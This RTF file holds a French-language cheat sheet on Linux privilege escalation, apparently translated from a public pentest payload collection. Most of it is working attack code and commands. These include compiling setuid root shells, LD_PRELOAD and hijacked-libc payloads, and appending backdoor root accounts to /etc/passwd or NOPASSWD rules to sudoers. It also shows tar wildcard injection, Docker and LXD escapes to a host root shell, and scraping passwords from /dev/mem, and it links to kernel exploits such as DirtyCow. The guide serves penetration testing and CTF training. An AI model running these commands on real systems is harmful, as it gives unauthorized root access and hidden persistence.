{\rtf1\ansi\ansicpg1252\cocoartf1561\cocoasubrtf610
{\fonttbl\f0\fmodern\fcharset238 Courier;\f1\fnil\fcharset134 PingFangSC-Regular;}
{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;}
\paperw11900\paperh16840\margl1440\margr1440\vieww34520\viewh19900\viewkind0
\deftab720
\pard\pardeftab720\sl280\partightenfactor0

\f0\fs24 \cf2 \expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec2 # Linux - Escalade de privil\uc0\u232 ges\
\
## Sommaire\
\
* [Outils](#outils)\
* [Checklist](#checklists)\
* [R\'e9cup\'e9ration de mots de passe](#recuperation-de-mots-de-passe)\
    * [Fichiers contenant des mots de passe](#fichiers-contenant-des-mots-de-passe)\
    * [Anciens mots de passe dans /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)\
    * [Derniers fichiers modifi\'e9s](#last-edited-files)\
    * [Mots de passe stock\'e9s en m\'e9moire](#in-memory-passwords)\
    * [Trouver des fichiers sensibles](#find-sensitive-files)\
* [T\'e2ches planifi\'e9es](#scheduled-tasks)\
    * [Cron jobs](#cron-jobs)\
    * [Systemd timers](#systemd-timers)\
* [SUID](#suid)\
    * [Trouver les binaires SUID](#find-suid-binaries)\
    * [Cr\'e9er un binaire SUID](#create-a-suid-binary)\
* [Capacit\'e9s](#capabilities)\
    * [Lister les capacit\'e9s des binaires](#list-capabilities-of-binaries)\
    * [Editer les capacit\'e9s](#edit-capabilities)\
    * [Capacit\'e9s interessantes](#interesting-capabilities)\
* [SUDO](#sudo)\
    * [NOPASSWD](#nopasswd)\
    * [LD_PRELOAD et NOPASSWD](#ld_preload-and-nopasswd)\
    * [Doas](#doas)\
    * [sudo_inject](#sudo-inject)\
* [GTFOBins](#gtfobins)\
* [Wildcard](#wildcard)\
* [Fichiers en \'e9criture](#writable-files)\
    * [/etc/passwd en \'e9criture](#writable-etcpasswd)\
    * [/etc/sudoers en \'e9criture](#writable-etcsudoers)\
* [Ecrasement des donn\'e9es NFS Root](#nfs-root-squashing)\
* [Codes partag\'e9s](#shared-library)\
    * [ldconfig](#ldconfig)\
    * [RPATH](#rpath)\
* [Groupes](#groups)\
    * [Docker](#docker)\
    * [LXC/LXD](#lxclxd)\
* [Exploit de kernel](#kernel-exploits)\
    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)\
    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)\
    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)\
    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)\
\
\
## Outils\
\
- [LinuxSmartEnumeration - Un outil d\'92\'e9num\'e9ration Linux pour le pentesting et les CTFs](https://github.com/diego-treitos/linux-smart-enumeration)\
\
    ```powershell\
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh\
    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh\
    ./lse.sh -l1 # shows interesting information that should help you to privesc\
    ./lse.sh -l2 # dump all the information it gathers about the system\
    ```\
\
- [LinEnum - Enum\'e9ration script\'e9e Linux locale & v\'e9rification des escalades de privil\uc0\u232 ges](https://github.com/rebootuser/LinEnum)\
    \
    ```powershell\
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t\
    ```\
\
- [BeRoot - Un projet autour de l\'92escalade de privil\uc0\u232 ge - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)\
- [linuxprivchecker.py - Un script Linux qui v\'e9rifie si l\'92escalade de privil\uc0\u232 ge est possible](https://github.com/sleventyeleven/linuxprivchecker)\
- [unix-privesc-check - Export\'e9 automatiquement depuis code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)\
- [Escalade de privil\uc0\u232 ges avec sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)\
\
\
## Checklists\
\
* Date de sortie du kernel et de la distribution\
* Informations syst\uc0\u232 me:\
  * Hostname\
  * D\'e9tails du r\'e9seau:\
  * IP actuelle\
  * D\'e9tails de la route par d\'e9faut\
  * Informations sur le serveur DNS\
* Informations utilisateur:\
  * D\'e9tails sur l\'92utilisateur actuel\
  * Derni\uc0\u232 re connexion des utilisateurs\
  * Montrer les utilisateurs connect\'e9s sur la machine\
  * Liste tous les utilisateurs y compris les informations uid/gid\
  * Liste les comptes root\
  * Extraire les policies de mots de passe et la m\'e9thode de stockage des hases\
  * V\'e9rifier la valeur de umask\
  * V\'e9rifier si les hases de mots de passe sont stock\'e9s dans /etc/passwd\
  * Extraire tous les d\'e9tails pour le uid (user id) par \'91d\'e9faut\'92 comme par exemple 0,1000, 1001, etc\'85\
  * Essayer de lire les fichiers restreints (comme /etc/shadow)\
  * Lister les fichiers d\'92historique pour l\'92utilisateur actuel (par exemple .bash_history, .nano_history, .mysql_history, etc\'85)\
  * V\'e9rifications SSH basiques\
* Acc\uc0\u232 s privili\'e9gi\'e9s:\
  * Quels utilisateurs ont r\'e9cemment utilis\'e9 sudo\
  * D\'e9terminer si /etc/sudoers est accessible\
  * D\'e9terminer si l\'92utilisateur actuel a un acc\uc0\u232 s sudo sans mot de passe\
  * D\'e9terminer si les bons \'91binaires\'92 de rupture (ici les binaires permettant de \'91briser\'92 les restrictions utilisateur) sont disponibles via sudo (ex: map, vim, etc\'85)\
  * D\'e9terminer si le r\'e9pertoire root est accessible\
  * Lister les permissions pour /home\
* Environmental:\
  * Afficher le $PATH actuel\
  * Afficher les informations env\
* Jobs/T\'e2ches:\
  * Lister tous les cron jobs\
  * Localiser tous les world-writable cron jobs\
  * Localiser les cron jobs poss\'e9d\'e9s par d\'92autres utilisateurs du syst\uc0\u232 me\
  * Lister tous les tiers systemd actifs ou non\
* Services:\
  * Lister toutes les connections r\'e9seau (TCP & UDP)\
  * Lister tous les processus en cours d\'92ex\'e9cution\
  * Consulter et lister les binaires de processus et leurs permissions associ\'e9es\
  * Lister le contenu de inetd.conf/xined.conf et les permissions de binaires associ\'e9es\
  * Lister les permissions du binaire init.d\
* La version des services/commandes suivantes:\
  * Sudo\
  * MYSQL\
  * Postgres\
  * Apache\
    * V\'e9rifier la configuration utilisateur\
    * Consulter les modules activ\'e9s\
    * V\'e9rifier les fichiers htpasswd\
    * Consulter le r\'e9pertoire www\
* Mots de passes faibles/par d\'e9faut:\
  * V\'e9rifier les comptes Postgres faibles/par d\'e9faut\
  * V\'e9rifier les comptes MySQL faibles/par d\'e9faut\
* Recherches:\
  * Localiser tous les fichiers SUID/GUID\
  * Localiser tous les fichiers SUID/GUID world-writable\
  * Localiser tous les fichiers SUID/GUID poss\'e9d\'e9s par root\
  * Localiser les fichiers SUID/GUID \'91int\'e9ressants\'92 (par exmple: nmap, vim etc)\
  * Localiser tous les fichiers avec les capacit\'e9s POSIX\
  * Lister tous les fichiers world-writable\
  * Trouver/lister tous les fichiers *.plan et consulter le contenu\
  * Trouver/lister tous les fichiers *.rhosts et consulter le contenu\
  * Consulter les d\'e9tails du serveur NFS\
  * Localiser les fichiers *.conf et *.log contenant les mots-cl\'e9s fournis au moment de l\'92ex\'e9cution du script\
  * Lister tous les fichiers *.conf localis\'e9s dans /etc\
  * Localiser les mails\
* Tests sp\'e9cifiques selon la platforme/le logiciel:\
  * V\'e9rifier si on est dans un container Docker\
  * V\'e9rifier si l\'92h\'f4te a Docker d\'92install\'e9\
  * V\'e9rifier si on est dans un container LXC\
\
## R\'e9cup\'e9ration de mots de passe\
\
### Fichiers contenant des mots de passe\
\
```powershell\
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null\
find . -type f -exec grep -i -I "PASSWORD" \{\} /dev/null \\;\
```\
\
### Anciens mots de passe dans /etc/security/opasswd\
\
Le fichier `/etc/security/opasswd` est aussi utilis\'e9 par pam_cracklib pour garder l\'92historique des anciens mots de passe pour que l\'92utilisateur ne les r\'e9utilise pas\
\
:warning: Consid\'e9rez votre fichier opasswd comme votre fichier /etc/shadow puisqu\'92il finira par contenir les hashs de mot de passe utilisateurs \
\
\
### Derniers fichiers \'e9dit\'e9s\
\
Fichiers \'e9dit\'e9s dans les 10 derni\uc0\u232 res minutes\
\
```powershell\
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"\
```\
\
### Mots de passe en m\'e9moire\
\
```powershell\
strings /dev/mem -n10 | grep -i PASS\
```\
\
### Trouver les fichiers sensibles\
\
```powershell\
$ locate password | more           \
/boot/grub/i386-pc/password.mod\
/etc/pam.d/common-password\
/etc/pam.d/gdm-password\
/etc/pam.d/gdm-password.original\
/lib/live/config/0031-root-password\
...\
```\
\
## T\'e2ches planifi\'e9es\
\
### Cron jobs\
\
V\'e9rifier si on a acc\uc0\u232 s \u224  ces fichiers avec les droits en \'e9criture   \
V\'e9rifier l\'92int\'e9rieur du fichier, pour trouver d\'92autres chemins de fichiers avec les droits en \'e9criture\
\
```powershell\
/etc/init.d\
/etc/cron*\
/etc/crontab\
/etc/cron.allow\
/etc/cron.d \
/etc/cron.deny\
/etc/cron.daily\
/etc/cron.hourly\
/etc/cron.monthly\
/etc/cron.weekly\
/etc/sudoers\
/etc/exports\
/etc/anacrontab\
/var/spool/cron\
/var/spool/cron/crontabs/root\
\
crontab -l\
ls -alh /var/spool/cron;\
ls -al /etc/ | grep cron\
ls -al /etc/cron*\
cat /etc/cron*\
cat /etc/at.allow\
cat /etc/at.deny\
cat /etc/cron.allow\
cat /etc/cron.deny*\
```\
\
Vous pouvez utiliser [pspy](https://github.com/DominicBreuker/pspy) pour d\'e9tecter un CRON job.\
\
```powershell\
# Montre les commandes et les \'e9v\uc0\u232 nements file system puis scan profs toutes les 1000 ms (=1 sec)\
./pspy64 -pf -i 1000 \
```\
\
\
## Systemd timers\
\
```powershell\
systemctl list-timers --all\
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES\
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service\
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service\
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\
\
3 timers listed.\
```\
\
## SUID\
\
SUID/Setuid veut dire "set user ID upon execution" (en fran\'e7ais d\'e9finir l\'92ID utilisateur lors de l\'92ex\'e9cution), c\'92est activ\'e9 par d\'e9faut dans toutes les distribs Linux. Si un fichier avec ce bit est lanc\'e9, l\'92uid sera chang\'e9 par celui de son possesseur. Si son possesseur est `root`, l\'92uid sera chang\'e9 en `root` m\uc0\u234 me s\'92il a \'e9t\'e9 ex\'e9cut\'e9 depuis l\'92utilisateur `bob`. Le bit SUID est repr\'e9sent\'e9 avec un `s`.\
\
```powershell\

\f1 \'a8\'71\'a9\'a4
\f0 swissky@lab ~  \

\f1 \'a8\'74\'a9\'a4
\f0 $ ls /usr/bin/sudo -alh                  \
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo\
```\
\
### Trouver les binaires SUID\
\
```bash\
find / -perm -4000 -type f -exec ls -la \{\} 2>/dev/null \\;\
find / -uid 0 -perm -4000 -type f 2>/dev/null\
```\
\
### Cr\'e9er un binaire SUID\
\
```bash\
print 'int main(void)\{\\nsetresuid(0, 0, 0);\\nsystem("/bin/sh");\\n\}' > /tmp/suid.c   \
gcc -o /tmp/suid /tmp/suid.c  \
sudo chmod +x /tmp/suid # execute right\
sudo chmod +s /tmp/suid # setuid bit\
```\
\
\
## Capacit\'e9s\
\
### Lister les capacit\'e9s des binaires\
\
```bash\

\f1 \'a8\'71\'a9\'a4
\f0 swissky@lab ~  \

\f1 \'a8\'74\'a9\'a4
\f0 $ /usr/bin/getcap -r  /usr/bin\
/usr/bin/fping                = cap_net_raw+ep\
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip\
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\
/usr/bin/rlogin               = cap_net_bind_service+ep\
/usr/bin/ping                 = cap_net_raw+ep\
/usr/bin/rsh                  = cap_net_bind_service+ep\
/usr/bin/rcp                  = cap_net_bind_service+ep\
```\
\
### Editer les capacit\'e9s\
\
```powershell\
/usr/bin/setcap -r /bin/ping            # supprime\
/usr/bin/setcap cap_net_raw+p /bin/ping # ajoute\
```\
\
### Capacit\'e9s int\'e9ressantes\
\
Avoir la capacit\'e9 =ep veut dire que le binaire a toutes les capacit\'e9s.\
```powershell\
$ getcap openssl /usr/bin/openssl \
openssl=ep\
```\
\
En alternative, on peut utiliser les capacit\'e9s suivantes pour upgrade nos privil\uc0\u232 ges actuels.\
\
```powershell\
cap_dac_read_search # pouvoir lire n\'92importe quoi\
cap_setuid+ep # setuid\
```\
\
Exemple d\'92escalade de privil\uc0\u232 ges avec `cap_setuid+ep`\
\
```powershell\
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7\
\
$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'\
sh-5.0# id\
uid=0(root) gid=1000(swissky)\
```\
\
| Nom de la capacit\'e9  | Description |\
|---|---|\
| CAP_AUDIT_CONTROL  | Autorise l\'92activation/d\'e9sactivation de l\'92audit du kernel |\
| CAP_AUDIT_WRITE  | Aide \uc0\u224  \'e9crire les enregistrements dans les logs de l\'92audit du kernel |\
| CAP_BLOCK_SUSPEND  | Cette fonctionnalit\'e9 peut bloquer les suspensions du syst\uc0\u232 me   |\
| CAP_CHOWN  | Autorise l\'92utilisateur \uc0\u224  faire des modifications arbitraires aux fichiers UIDs et GIDs |\
| CAP_DAC_OVERRIDE  | Aide \uc0\u224  contourner les v\'e9rifications des permissions de lecture, d\'92\'e9criture ou d\'92ex\'e9cution |\
| CAP_DAC_READ_SEARCH  | Contourne uniquement les v\'e9rifications de permissions de lecture/d\'92ex\'e9cution des fichiers et des r\'e9pertoire  |\
| CAP_FOWNER  | Permet de contourner les contr\'f4les d'autorisation sur les op\'e9rations qui exigent normalement que l'UID du syst\uc0\u232 me de fichiers du processus corresponde \u224  l'UID du fichier  |\
| CAP_KILL  | Autorise l\'92envoi de signaux \uc0\u224  des processus appartenants \u224  d\'92autres  |\
| CAP_SETGID  | Autorise le changement du GID  |\
| CAP_SETUID  | Autorise la changement de l\'92UID  |\
| CAP_SETPCAP  | Aide au transfert et \uc0\u224  la suppression du param\u232 tre actuel \u224  n\'92importe quel PID |\
| CAP_IPC_LOCK  | Aide \uc0\u224  bloquer la m\'e9moire  |\
| CAP_MAC_ADMIN  | Autorise la modification de la configuration ou de l\'92\'e9tat MAC  |\
| CAP_NET_RAW  | Utilise des sockets RAW et PACKET |\
| CAP_NET_BIND_SERVICE  | SERVICE lie un socket aux ports privil\'e9gi\'e9s du domaine internet  |\
\
## SUDO\
Outil: [Exploitation sudo](https://github.com/TH3xACE/SUDO_KILLER)\
\
### NOPASSWD\
\
La configuration sudo pourrait autoriser un utilisateur \uc0\u224  ex\'e9cuter des commandes avec d\'92autres privil\u232 ges utilisateurs sans conna\'eetre leur mot de passe.\
\
```bash\
$ sudo -l\
\
User demo may run the following commands on crashlab:\
    (root) NOPASSWD: /usr/bin/vim\
```\
\
Dans cet exemple l\'92utilisateur `demo` peut lancer `vim` en tant que `root`, il est donc maintenant simple d\'92obtenir un shell en ajoutant une cl\'e9 ssh dans le r\'e9pertoire root ou en utilisant `sh`.\
\
```bash\
sudo vim -c '!sh'\
sudo -u root vim -c '!sh'\
```\
\
### LD_PRELOAD and NOPASSWD\
\
If `LD_PRELOAD` is explicitly defined in the sudoers file\
\
```powershell\
Defaults        env_keep += LD_PRELOAD\
```\
\
Compile les objets partag\'e9s suivant en utilisant le code C ci-dessous avec `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`\
\
```powershell\
#include <stdio.h>\
#include <sys/types.h>\
#include <stdlib.h>\
void _init() \{\
	unsetenv("LD_PRELOAD");\
	setgid(0);\
	setuid(0);\
	system("/bin/sh");\
\}\
```\
\
Ex\'e9cute n\'92importe quel binaire avec LD_PRELOAD pour faire spawn un shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`\
\
### Doas\
\
Il existe certaines alternatives au binaire `sudo` comme `doas` pour OpenBSD, n\'92oubliez pas de v\'e9rifier sa configuration dans `/etc/doas.conf`\
\
```bash\
permit nopass demo as root cmd vim\
```\
\
### sudo_inject\
\
On utilise [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)\
\
```powershell\
$ sudo whatever\
[sudo] password for user:    \
# Pressez <ctrl>+c puisque vous n\'92avez pas le mot de passe. \
# Cela cr\'e9e un token sudo invalide.\
$ sh exploit.sh\
.... wait 1 seconds\
$ sudo -i # pas de mot de passe requis :)\
# id\
uid=0(root) gid=0(root) groups=0(root)\
```\
\
Diapos de pr\'e9sentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)\
\
## GTFOBins\
\
[GTFOBins](https://gtfobins.github.io) est une liste de conservation des binaires Unix qui peut \uc0\u234 tre utilis\'e9 par un attaquant pour contourner les restrictions de s\'e9curit\'e9 locales.\
\
Le projet collecte les fonctions l\'e9gitimes des binaires d\'92Unix dont on peut se servir pour sortir d\'92un shell restreint, pour escalader ou maintenir des privil\uc0\u232 ges \'e9lev\'e9s, transf\'e9rer des fichiers, faire spawn des bine et des reverse shells, et faciliter d\'92autres t\'e2ches de post-exploitation.\
\
> gdb -nx -ex '!sh' -ex quit    \
> sudo mysql -e '\\! /bin/sh'    \
> strace -o /dev/null /bin/sh    \
> sudo awk 'BEGIN \{system("/bin/sh")\}'\
\
\
## Wildcard\
\
en utilisant tar avec l\'92option \'96checkpoint-action, un action sp\'e9cifique peut \uc0\u234 tre ex\'e9cut\'e9e apr\u232 s un checkpoint. Cette action pourrait \u234 tre un script malicieux utilis\'e9 pour ex\'e9cuter des commandes sous l\'92utilisateur qui d\'e9marre tar. \'93Pi\'e9ger\'94 root pour utiliser cette option sp\'e9cifique est plut\'f4t simple, et c\'92est ici que les wildcard deviennent int\'e9ressantes.\
\
```powershell\
# Cr\'e9er un fichier pour l\'92exploitation\
touch -- "--checkpoint=1"\
touch -- "--checkpoint-action=exec=sh shell.sh"\
echo "#\\!/bin/bash\\ncat /etc/passwd > /tmp/flag\\nchmod 777 /tmp/flag" > shell.sh\
\
# Script vuln\'e9rable\
tar cf archive.tar *\
```\
\
Outil: [wildpwn](https://github.com/localh0t/wildpwn)\
\
## Fichiers avec les droits en \'e9criture\
\
Lister tous les fichiers avec les droits en \'e9criture sur le syst\uc0\u232 me.\
\
```powershell\
find / -writable ! -user \\`whoami\\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al \{\} \\; 2>/dev/null\
find / -perm -2 -type f 2>/dev/null\
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null\
```\
\
### /etc/passwd avec les permissions en \'e9criture\
\
On g\'e9n\uc0\u232 re d\'92abord un mot de passe avec la commande suivante.\
\
```powershell\
openssl passwd -1 -salt hacker hacker\
mkpasswd -m SHA-512 hacker\
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'\
```\
\
On ajoute ensuite l\'92utilisateur `hacker` et on ajoute le mot de passe g\'e9n\'e9r\'e9.\
\
```powershell\
hacker:MOT_DE_PASE_GENERE:0:0:Hacker:/root:/bin/bash\
```\
\
Exemple: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`\
\
On peut d\'e9sormais utiliser la commande `su` avec `hacker:hacker`\
\
En alternative, on peut utiliser les lignes suivantes pour ajouter un utilisateur \'91d\'e9bile\'92 sans mot de passe.\
:warning: Vous pouvez d\'e9grader la s\'e9curit\'e9 de la machine\
\
```powershell\
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd\
su - dummy\
```\
\
NOTE: Sur les plateformes BSD `/etc/passwd` est situ\'e9 dans `/etc/pwd.db` et `/etc/master.passwd`. Le `/etc/shadow` est \'e9galement renomm\'e9 en `/etc/spwd.db`. \
\
### /etc/sudoers avec les permissions en \'e9criture\
\
```powershell\
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers\
\
# On utilise sudo sans mot de passe :)\
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers\
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers\
```\
\
## Ecrasement des donn\'e9es NFS Root\
\
quand **no_root_squash** appara\'eet dans `/etc/exports`, le fichier est partageable est un utilisateur distant peut le monter.\
\
```powershell\
# On v\'e9rifier le nom du dossier \uc0\u224  distance\
showmount -e 10.10.10.10\
\
# On cr\'e9e un r\'e9pertoire\
mkdir /tmp/nfsdir  \
\
# Et on le monte \
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    \
cd /tmp/nfsdir\
\
# On copie le shell que l\'92on souhaite \
cp /bin/bash . 	\
\
# On d\'e9finie la permission SUID\
chmod +s bash 	\
```\
\
## Library partag\'e9e\
\
### ldconfig\
\
Identifier les librarys partag\'e9es avec `ldd`\
\
```powershell\
$ ldd /opt/binary\
    linux-vdso.so.1 (0x00007ffe961cd000)\
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)\
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        \
```\
\
On cr\'e9e library dans `/tmp` (on poss\uc0\u232 de les droits d\'92\'e9critures ici) et on active le chemin de fichiers.\
\
```powershell\
gcc \'96Wall \'96fPIC \'96shared \'96o vulnlib.so /tmp/vulnlib.c\
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so\
/opt/binary\
```\
\
### RPATH\
\
```powershell\
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"\
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\
\
level15@nebula:/home/flag15$ ldd ./flag15 \
 linux-gate.so.1 =>  (0x0068c000)\
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)\
 /lib/ld-linux.so.2 (0x005bb000)\
```\
\
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilis\'e9e ici par le programme comme sp\'e9cifi\'e9 dans la variable `RPATH`.\
\
```powershell\
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\
\
level15@nebula:/home/flag15$ ldd ./flag15 \
 linux-gate.so.1 =>  (0x005b0000)\
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)\
 /lib/ld-linux.so.2 (0x00737000)\
```\
\
On cr\'e9e ensuite une lib malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`\
\
```powershell\
#include<stdlib.h>\
#define SHELL "/bin/sh"\
\
int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))\
\{\
 char *file = SHELL;\
 char *argv[] = \{SHELL,0\};\
 setresuid(geteuid(),geteuid(), geteuid());\
 execve(file,argv,0);\
\}\
```\
\
## Groupes\
\
### Docker\
\
On le syst\uc0\u232 me de fichiers dans un conteneur bash, nous autorisant \u224  \'e9diter `/etc/passwd` en tant que root, on ajoute ensuite le compte backdoor `toor:password`.\
\
```bash\
$> docker run -it --rm -v $PWD:/mnt bash\
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd\
```\
\
Presque similaire mais vous verrez aussi des processus lanc\'e9s sur l\'92h\'f4te et connect\'e9s sur les m\uc0\u234 mes NICs.\
\
```powershell\
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash\
```\
\
Ou utilisez l\'92image docker suivante de [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) pour faire spawn un shell root.\
\
```powershell\
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\
latest: Pulling from chrisfosterelli/rootplease\
2de59b831a23: Pull complete \
354c3661655e: Pull complete \
91930878a2d7: Pull complete \
a3ed95caeb02: Pull complete \
489b110c54dc: Pull complete \
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0\
Status: Downloaded newer image for chrisfosterelli/rootplease:latest\
\
You should now have a root shell on the host OS\
Press Ctrl-D to exit the docker instance / shell\
\
sh-5.0# id\
uid=0(root) gid=0(root) groups=0(root)\
```\
\
Plus d\'92escalade de privil\uc0\u232 ges en utilisant le cocker Docker.\
\
```powershell\
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash\
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh\
```\
\
### LXC/LXD\
\
privesc requiert le lancement d\'92un conteneur avec des privil\uc0\u232 ges \'e9lev\'e9s et le montage du syst\u232 me de fichiers de l\'92h\'f4te \u224  l\'92int\'e9rieur.\
\
```powershell\

\f1 \'a8\'71\'a9\'a4
\f0 swissky@lab ~  \

\f1 \'a8\'74\'a9\'a4
\f0 $ id\
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)\
```\
\
On cr\'e9e une image Alpine et on la d\'e9marre en utilisant `security.privileged=true`, obligeant le conteneur \uc0\u224  interagir en tant que root avec le syst\u232 me de fichiers de l\'92h\'f4te.\
\
```powershell\
# On cr\'e9e une image Alpine simple\
git clone https://github.com/saghul/lxd-alpine-builder\
./build-alpine -a i686\
\
# On importe l\'92image\
lxc image import ./alpine.tar.gz --alias myimage\
\
# On lance l\'92image\
lxc init myimage mycontainer -c security.privileged=true\
\
# On monte le /root \uc0\u224  l\'92int\'e9rieur de l\'92image\
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\
\
# On interagit avec le conteneur\
lxc start mycontainer\
lxc exec mycontainer /bin/sh\
```\
\
En alternative, https://github.com/initstring/lxd_root\
\
## Exploits Kernel\
\
On peut trouver des exploits pr\'e9-compil\'e9s dans ces repos, utilisez-les \uc0\u224  vos risques et p\'e9rils !\
* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)\
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)\
\
Les exploits suivants sont connus pour le bon fonctionnement. Vous pouvez chercher d\'92autres exploits en utilisant `searchsploit -w linux kernel centos`.\
\
### CVE-2016-5195 (DirtyCow)\
\
Escalade de privil\uc0\u232 ges (Kernel Linux < 3.19.0-73.8)\
\
```powershell\
# make dirtycow stable\
echo 0 > /proc/sys/vm/dirty_writeback_centisecs\
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\
```\
\
### CVE-2010-3904 (RDS)\
\
Exploit RDS Linux  (Kernel Linux < 2.6.36-rc8)\
\
```powershell\
https://www.exploit-db.com/exploits/15285/\
```\
\
### CVE-2010-4258 (Full Nelson)\
\
Kernel Linux 2.6.37 (RedHat / Ubuntu 10.04)\
\
```powershell\
https://www.exploit-db.com/exploits/15704/\
```\
\
### CVE-2012-0056 (Mempodipper)\
\
Kernel Linux 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)\
\
```powershell\
https://www.exploit-db.com/exploits/18411\
```\
\
\
## R\'e9f\'e9rences\
\
- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)\
- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)\
- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)\
- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)\
- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)\
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)\
- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)\
- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)\
- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)\
- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)\
* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)\
* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)\
\
Traduit par ze4lk\
